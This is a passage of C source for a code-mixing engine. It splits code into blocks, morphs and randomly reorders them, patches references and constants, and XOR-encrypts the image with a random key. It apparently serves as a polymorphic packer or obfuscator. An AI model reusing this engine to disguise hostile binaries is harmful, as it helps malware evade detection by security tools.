	PCHAR	BlockPtr = (PCHAR)BlockDesc->BlockTable + CodeBlock->Offset;

	ASSERT(BlockDesc->Index <= MAX_BLOCKS);

	if (BlockPtr && CodeBlock->Size)
	{
		memcpy(BlockDesc->Binary, BlockPtr, CodeBlock->Size);
		BlockDesc->sSize = CodeBlock->Size;
		BlockDesc->Flags |= (CodeBlock->Flags & (~BF_TYPE_MASK));
		if (CodeBlock->Flags & BF_TYPE_DATA)
			// Block contains data: cannot be mixed or modifyed
			BlockDesc->Size = BlockDesc->sSize;
		else
			ProcessBlock(BlockDesc);
		
		Ret = TRUE;
	}
	return(Ret);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Generates morphed core block.
//
static BOOL GetMorphedCore(
				OUT PBLOCK_DESCRIPTOR	BlockDesc		// block descriptor
				)
{
	BOOL Ret = TRUE;
	PCHAR Core = (PCHAR)&g_core_start;
	PCHAR CoreEnd = (PCHAR)&g_core_end;
	LONG CoreSize = (LONG)(CoreEnd-Core);

	ASSERT(CoreSize > 0);

	memcpy(BlockDesc->Binary, Core, CoreSize);
	BlockDesc->sSize = CoreSize;
	BlockDesc->Size = CoreSize;
	ProcessBlock(BlockDesc);	

	return(Ret);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Links instance list into common instance list.
//
VOID LinkInstance(
		IN	PLIST_ENTRY	TopInstanceListHead,	// common instance list
	    IN	PLIST_ENTRY	InstanceListHead,		// instance list of a single block to link
		IN	ULONG		Offset,					// block offset relaitive to mixed code base
		OUT	ULONG*		InstanceCount			// returns number of instances that were linked
		)
{
	PLIST_ENTRY pEntry = InstanceListHead->Flink;

	while (pEntry != InstanceListHead)
	{
		PDATA_INSTANCE Instance = CONTAINING_RECORD(pEntry, DATA_INSTANCE, InstanceListEntry);
		PLIST_ENTRY	AccEntry = Instance->AccessListHead.Flink;
		pEntry = pEntry->Flink;
		RemoveEntryList(&Instance->InstanceListEntry);
		InitializeListHead(&Instance->InstanceListEntry);

		ASSERT(!IsListEmpty(&Instance->AccessListHead));

		do
		{	// Adjusting offsets 
			PACCESS_DESCRIPTOR AccDesc = CONTAINING_RECORD(AccEntry, ACCESS_DESCRIPTOR, Entry);
			AccDesc->Instruction += Offset;
			AccDesc->Pointer += Offset;
			AccEntry = AccEntry->Flink;
		} while(AccEntry != &Instance->AccessListHead);

		if (InstanceListAdd(TopInstanceListHead, Instance))
			*InstanceCount += 1;
	}
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Unlink instance from the common instance list.
//
VOID UnlinkInstances(
	    IN	PLIST_ENTRY	InstanceListHead,		// instance list of a single block to link
		IN	ULONG		InstanceCount			// returns number of instances that were unlinked
		)
{
	PLIST_ENTRY pEntry = InstanceListHead->Flink;

	while (pEntry != InstanceListHead)
	{
		PDATA_INSTANCE Instance = CONTAINING_RECORD(pEntry, DATA_INSTANCE, InstanceListEntry);
		PLIST_ENTRY	AccEntry = Instance->AccessListHead.Flink;
		pEntry = pEntry->Flink;
		RemoveEntryList(&Instance->InstanceListEntry);

		ASSERT(!IsListEmpty(&Instance->AccessListHead));

		do
		{	// Adjusting offsets 
			PACCESS_DESCRIPTOR AccDesc = CONTAINING_RECORD(AccEntry, ACCESS_DESCRIPTOR, Entry);
			AccEntry = AccEntry->Flink;
			RemoveEntryList(&AccDesc->Entry);
			Free(AccDesc);
		} while(AccEntry != &Instance->AccessListHead);

		InstanceCount -= 1;
		Free(Instance);
	}	// while (pEntry != InstanceListHead)

	ASSERT(InstanceCount == 0);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Links block instance lists into common code instance lists.
//
static BOOL LinkBlockToCode(
		PMIXED_CODE			MixedCode, 
		PBLOCK_DESCRIPTOR	BlockDesc,
		PGROW_BUFFER		gBuffer
		)
{
	BOOL Ret = TRUE;
	PIMAGE_BLOCK	ImageBlock = Alloc(sizeof(IMAGE_BLOCK));

	if (!IsListEmpty(&BlockDesc->ConstListHead))
		LinkInstance(&MixedCode->ConstListHead, &BlockDesc->ConstListHead, BlockDesc->Offset, &MixedCode->ConstCount);

	if (!IsListEmpty(&BlockDesc->CRefListHead))
		LinkInstance(&MixedCode->CRefListHead, &BlockDesc->CRefListHead, BlockDesc->Offset, &MixedCode->CRefCount);

	if (ImageBlock)
	{
		InitializeListHead(&ImageBlock->Entry);
		ImageBlock->Flags = BlockDesc->Flags;
		ImageBlock->Size = BlockDesc->Size;
		ImageBlock->Binary = gBuffer->Pos;
		ImageBlock->Index = BlockDesc->Index;
		InsertTailList(&MixedCode->BlockListHead, &ImageBlock->Entry);
	}

	ASSERT((BlockDesc->Size & 1) == 0);	// Blocks sizes have to be aligned by 2 (required fo encryption)
	GbAppend(gBuffer, BlockDesc->Binary, BlockDesc->Size);

	return(Ret);
}



BOOL ProcessCrossReferences(
			PMIXED_CODE		MixedCode,
			PCHAR*			OffsetMap
			)
{
	BOOL Ret = TRUE;
	ULONG i;
	PLIST_ENTRY pEntry = MixedCode->CRefListHead.Flink;

	for(i=0; i<MixedCode->CRefCount; i++)
	{
		PDATA_INSTANCE CRefInst = CONTAINING_RECORD(pEntry, DATA_INSTANCE, InstanceListEntry);
		PLIST_ENTRY AccEntry = CRefInst->AccessListHead.Flink;
		ASSERT(pEntry != &MixedCode->CRefListHead);
		ASSERT(AccEntry != &CRefInst->AccessListHead);
		do
		{
			PACCESS_DESCRIPTOR AccDesc = CONTAINING_RECORD(AccEntry, ACCESS_DESCRIPTOR, Entry);
			PULONG	Pointer = (PULONG)(MixedCode->Image + AccDesc->Pointer);
			LONG	Offset = (LONG)(OffsetMap[*(PUSHORT)Pointer] - (PCHAR)Pointer);

			if (AccDesc->Flags & BF_CODE16)
				*(PUSHORT)Pointer = (USHORT)(Offset - sizeof(USHORT));
			else
				*Pointer = (ULONG)(Offset - sizeof(ULONG));
			AccEntry = AccEntry->Flink;
		} while(AccEntry !=  &CRefInst->AccessListHead);

		pEntry = pEntry->Flink;
	}
	ASSERT(pEntry == &MixedCode->CRefListHead);

	return(Ret);
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Creates an image of mixed blocks.
//
static BOOL BmeImage(
		IN	PCODE_BLOCK	CodeBlock,		// array of CODE_BLOCK structures to mix
		PMIXED_CODE		MixedCode	// mixed code descriptor structure
		)
{
	BOOL	Ret = FALSE;
	ULONG	BlockCount = 0, TotalSize = 0,  TotalCount, i, c, EntrySize = 0;
	PUCHAR	RndIndexMap = 0, IndexMap, CorePtr = 0, OffsetTable = 0, EntryPtr = 0, EntryPos = 0;
	PCODE_BLOCK	pCurrent = CodeBlock;
	PCHAR*	OffsetMap;  
	GROW_BUFFER	Image;
	PBLOCK_DESCRIPTOR BlockDesc = AllocateBlock();
	ULONG	BmeRand = (rand() << 16) + rand();

	if (!BlockDesc)
		return(FALSE);

	if (MixedCode->Flags & MCF_NO_EBP)
		MixedCode->Flags &= (~MCF_RND_INDEX);


	ASSERT(MixedCode->Magic == MIXED_CODE_MAGIC);

	srand(BmeRand);
	MixedCode->XorValue = (rand() << 8) + rand();

	// Calculating number of code blocks and their total size.
	while (pCurrent->Offset != 0)
	{
#if _DEBUG
		if (*(PUCHAR)pCurrent->Offset == 0xe9)
			pCurrent->Offset += *(ULONG_PTR*)((PCHAR)pCurrent->Offset + 1) + 5;
#endif
		pCurrent->Size = (ULONG)((ULONG_PTR)pCurrent->Size - (ULONG_PTR)pCurrent->Offset);
		pCurrent->Offset -= (ULONG_PTR)CodeBlock;

		TotalSize += pCurrent->Size;
		BlockCount += 1;
		pCurrent += 1;
	}

	// We have 3 extra reserved blocks: core, function table, entry.
	TotalCount = BlockCount + RESERVED_BLOCKS;
	if ((BlockCount) && (TotalCount <= MAX_BLOCKS) && (TotalSize))
	{	
		if (!(RndIndexMap = (PCHAR)Alloc(TotalCount)))
			return(FALSE);

		//Preinitializing ranrom index map
		for (i=0; i<TotalCount; i++)
			RndIndexMap[i] = (UCHAR)(i+1);

		if (MixedCode->Flags & MCF_RND_INDEX)
		{
			// Randomizing random index map
			GenerateBlockMap(RndIndexMap, 1, BlockCount);
			MixedCode->IndexBase = rand()%256;
		}
		
		IndexMap = (PCHAR)Alloc(TotalCount);	
		if (IndexMap)
		{
			if (OffsetMap = (PCHAR*)Alloc(TotalCount * sizeof(PVOID)))
			{
				if (Ret = GbAlloc(&Image, DEFAULT_IMAGE_SIZE))
				{
					// Create random block map.
					GenerateBlockMap(IndexMap, 1, TotalCount);

					if (MixedCode->Flags & MCF_ENTRY_AT_BEGIN)
					{
						i = 0;
						c = 0;
						// Looking for the Entry block
						while(CodeBlock[i].Offset && !(CodeBlock[i].Flags & BF_TYPE_ENTRY))
							i++;
						ASSERT(i < BlockCount);
						i += 1;

						while(IndexMap[c] != i)
						{
							ASSERT(c < BlockCount);
							c++;
						}
						IndexMap[c] = IndexMap[0];
						IndexMap[0] = (UCHAR)i;
					}	// if (MixedCode->Flags & MCF_ENTRY_AT_BEGIN)
									
					for (i=0; (Ret == TRUE &&  i<TotalCount); i++)
					{
						UCHAR Index = IndexMap[i]-1;
						ASSERT( Index >= 0 && Index <= MAX_BLOCKS);

						Ret = FALSE;
						BlockDesc->Index = Index;
						BlockDesc->NewIndex = RndIndexMap[Index] - 1;
						BlockDesc->Flags = MixedCode->Flags;
						BlockDesc->RndIndexMap = RndIndexMap;


						do	// not a loop 
						{
							if (Index >= BlockCount)
							{
								// Allocateing space for a function table
								if (!(MixedCode->Flags & MCF_NO_EBP))
								{								
									BlockDesc->Size = BlockCount*sizeof(CODE_TABLE_ENTRY);
									if ((BlockDesc->Binary = (PCHAR)Alloc(BlockDesc->Size)) && GbCheckResize(&Image, BlockDesc->Size))
									{
										OffsetTable = Image.Pos;
										Ret = TRUE;
									}
								}
								else	// if (!(MixedCode->Flags & MCF_NO_EBP))
									// No function table
									Ret = TRUE;
								break;
							}	// if (Index >= BlockCount)

							pCurrent = &CodeBlock[Index];
							BlockDesc->BlockTable = CodeBlock;

							// Checking if current block is a collection of aliases
							if ((pCurrent->Flags & BF_ALIASES) && !(pCurrent->Flags & MixedCode->Flags & MCF_IGNORE_MASK))
							{
								// Selecting first not-ignored alias 
								pCurrent = (PCODE_BLOCK)((PCHAR)BlockDesc->BlockTable + pCurrent->Offset);

								while (pCurrent->Offset && (pCurrent->Flags & MixedCode->Flags & MCF_IGNORE_MASK))
									pCurrent += 1;
							}

							// Cecking if current block should be ignored 
							if ((!pCurrent->Offset) || (pCurrent->Flags & MixedCode->Flags & MCF_IGNORE_MASK))
							{
								// Ignoring block
								BlockDesc->Binary = NULL;
								BlockDesc->Size = 0;
								Ret = TRUE;
								break;
							}


							if (pCurrent->Flags & BF_TYPE_CORE)
							{
								// Creating a core
								ASSERT(!(pCurrent->Flags & BF_TYPE_ENTRY));

								if (!(MixedCode->Flags & MCF_NO_EBP))
								{								
									while (pCurrent->Offset && (pCurrent->Flags & MixedCode->Flags & MCF_IGNORE_MASK))
										pCurrent += 1;

									ASSERT(pCurrent->Offset);
									ASSERT(pCurrent->Size);

									if (GetMorphedBlock(pCurrent, BlockDesc) && GbCheckResize(&Image, BlockDesc->Size))
									{
										CorePtr = Image.Pos + BlockDesc->Entry;
										Ret = TRUE;
									}
								}
								else	// if (!(MixedCode->Flags & MCF_NO_EBP))
								{
									// No core
									CorePtr = Image.Pos;
									Ret = TRUE;
								}	// if (!(MixedCode->Flags & MCF_NO_EBP))
								break;
							}	// // if (pCurrent->Flags & BF_TYPE_CORE)

							if (pCurrent->Flags & BF_TYPE_ENTRY)
							{
								// Creating program entry block.
								// It can be mixed with jumps, but should start at offset 0, coz it can be placed at the beginning of
								//  the code section.
								while (pCurrent->Offset && (pCurrent->Flags & MixedCode->Flags & MCF_IGNORE_MASK))
									pCurrent += 1;

								ASSERT(pCurrent->Offset);
								ASSERT(pCurrent->Size);
								
								BlockDesc->Flags |= BF_ENTRY_AT_BEGIN;

								if (GetMorphedBlock(pCurrent, BlockDesc) && GbCheckResize(&Image, BlockDesc->Size))
								{
									ASSERT(BlockDesc->Entry == 0);
									EntryPos = Image.Pos;
									EntryPtr = Image.Pos + BlockDesc->Entry;
									EntrySize = BlockDesc->Size;
									Ret = TRUE;
								}
								break;
							}

							// Creating normal code block
							if (GetMorphedBlock(pCurrent, BlockDesc) && GbCheckResize(&Image, BlockDesc->Size))
								Ret = TRUE;

							if (pCurrent->Flags & BF_TYPE_DATA)
							{
								// Initializing data block
								PUSHORT	pXorValue = (PUSHORT)(BlockDesc->Binary + sizeof(ULONG));
								*pXorValue = (USHORT)MixedCode->XorValue;
							}
	
						} while(FALSE);
								
						if (Ret)
						{
							// Saving block offset value into OffsetMap and copying block to the image
							OffsetMap[RndIndexMap[Index] - 1] = Image.Pos + BlockDesc->Entry;
							BlockDesc->Offset = (ULONG)(Image.Pos - Image.Buffer);
							LinkBlockToCode(MixedCode, BlockDesc, &Image);
						}

						ReleaseBlock(BlockDesc);
					}	// for (i=0; i<TotalCount; i++)


					if (Ret)
					{
						// Recalculating function table:
						PCODE_TABLE_ENTRY pTable = (PCODE_TABLE_ENTRY)OffsetTable;
						MixedCode->Block0Offset = (ULONG)(OffsetMap[RndIndexMap[0] - 1] - CorePtr);

						if (!(MixedCode->Flags & MCF_NO_EBP))
						{
							for (i=0; i<BlockCount; i++)
							{
								pTable[i].Offset = (SHORT)(OffsetMap[i] - CorePtr);
#if _DUMP_BLOCKS
								// Dumping blocks' offsets 
								printf(" %u - 0x%x\n", i, (OffsetMap[RndIndexMap[i] - 1] - Image.Buffer - EntrySize));
#endif
							}
							// Saving function table offset into the core:
							MixedCode->TableOffset = (ULONG)(OffsetTable - CorePtr);
						}
					
						// Saving return parameters:
						MixedCode->Image = Image.Buffer;
						MixedCode->Size = (ULONG)(Image.Pos - Image.Buffer);
						MixedCode->CoreOffset = (ULONG)(CorePtr - MixedCode->Image);
						MixedCode->EntryPoint = (ULONG)(EntryPtr - MixedCode->Image);
						MixedCode->EntryOffset = (ULONG)(EntryPos - MixedCode->Image);
						MixedCode->EntrySize = EntrySize;

						// Processing blocks' cross referencess
						ProcessCrossReferences(MixedCode, OffsetMap);
					}
					else
						GbFree(&Image);
				}	// if (GbAlloc(&Image, DEFAULT_IMAGE_SIZE))

				Free(OffsetMap);
			}	// if (OffsetMap = (PVOID*)Alloc(TotalCount * sizeof(PVOID)))

			Free(IndexMap);
		}	// if (IndexMap)
	}	// if ((BlockCount) &&

	FreeBlock(BlockDesc);

	BmeRand = rand();

	return(Ret);
}

	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Initializes used constants.
//
BOOL BmeConstants(PMIXED_CODE MixedCode, PCONST_DESCRIPTOR Constants)
{
	BOOL Ret = TRUE;
	ULONG i;
	PLIST_ENTRY pEntry = MixedCode->ConstListHead.Flink;

	for(i=0; i<MixedCode->ConstCount; i++)
	{
		PDATA_INSTANCE ConstInst = CONTAINING_RECORD(pEntry, DATA_INSTANCE, InstanceListEntry);
		PLIST_ENTRY AccEntry = ConstInst->AccessListHead.Flink;
		ASSERT(AccEntry != &ConstInst->AccessListHead);
		do
		{
			PACCESS_DESCRIPTOR AccDesc = CONTAINING_RECORD(AccEntry, ACCESS_DESCRIPTOR, Entry);
			ULONG_PTR* Pointer = (ULONG_PTR*)(MixedCode->Image + AccDesc->Pointer);
			ASSERT((*Pointer & CONST_INDEX_MASK) == ConstInst->InstanceId);
			if (AccDesc->Flags & BF_CODE16)
				*(PUSHORT)Pointer = (USHORT)Constants[ConstInst->InstanceId].Value;
			else
				*Pointer = Constants[ConstInst->InstanceId].Value;
			
			AccEntry = AccEntry->Flink;
		} while(AccEntry !=  &ConstInst->AccessListHead);

		pEntry = pEntry->Flink;
	}
	ASSERT(pEntry == &MixedCode->ConstListHead);

	return(Ret);
}


VOID BmeEncryptBlock(
				 PUSHORT	Binary,
				 ULONG		Size,		// in words
				 USHORT		XorValue
				 )
{
	ULONG	i;

	for (i = 0; i<Size; i++)
	{
		*Binary ^= XorValue;
		Binary += 1;
	}

}


BOOL BmeEncryptImage(
			  PMIXED_CODE			MixedCode
			  )
{
	BOOL	Ret = TRUE;
	PUSHORT	Binary;
	PIMAGE_BLOCK	ImageBlock;
	PLIST_ENTRY	pEntry = MixedCode->BlockListHead.Flink;

	while (pEntry != &MixedCode->BlockListHead)
	{
		ImageBlock = CONTAINING_RECORD(pEntry, IMAGE_BLOCK, Entry);
		pEntry = pEntry->Flink;
		if (!(ImageBlock->Flags & BF_INIT))
		{
			ULONG	dSize = ImageBlock->Size/2;
			ASSERT(ImageBlock->Size ==(dSize*2));

			Binary = (PUSHORT)ImageBlock->Binary;
			BmeEncryptBlock(Binary, dSize, (USHORT)MixedCode->XorValue);
		}	// if (!(ImageBlock->Flags & BF_TYPE_INIT))
	}	// while (pEntry != &MixedCode->BlockListHead)

	return(Ret);
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Creates decriptor code of mixed blocks.
//
BOOL BmeCreateMixedCode(
			 IN	PMIXED_CODE	MixedCode,
			 IN	PCODE_BLOCK	CodeBlock,		
			 ULONG			Seed,
			 ULONG			Flags
			 )
{
	BOOL Ret = FALSE;
	srand(Seed);

#if _DEBUG
	MixedCode->Magic = MIXED_CODE_MAGIC;
#endif
	InitializeListHead(&MixedCode->ConstListHead);
	InitializeListHead(&MixedCode->CRefListHead);
	InitializeListHead(&MixedCode->BlockListHead);
	MixedCode->Flags = Flags | MCF_RND_INDEX;
	Ret = BmeImage(CodeBlock, MixedCode);

	return(Ret);
}



BOOL BmeReleaseMixedCode(
			 PMIXED_CODE	MixedCode
			 )
{
	BOOL Ret = FALSE;
	PLIST_ENTRY	pEntry;

	ASSERT(MixedCode->Magic == MIXED_CODE_MAGIC);

	UnlinkInstances(&MixedCode->ConstListHead, MixedCode->ConstCount);
	UnlinkInstances(&MixedCode->CRefListHead, MixedCode->CRefCount);

	pEntry = MixedCode->BlockListHead.Flink;
	while(pEntry != &MixedCode->BlockListHead)
	{
		PIMAGE_BLOCK	ImgBlock = CONTAINING_RECORD(pEntry, IMAGE_BLOCK, Entry);
		pEntry = pEntry->Flink;

		RemoveEntryList(&ImgBlock->Entry);
		Free(ImgBlock);
	}	// while(pEntry != &MixedCode->BlockListHead)

	return(Ret);
}
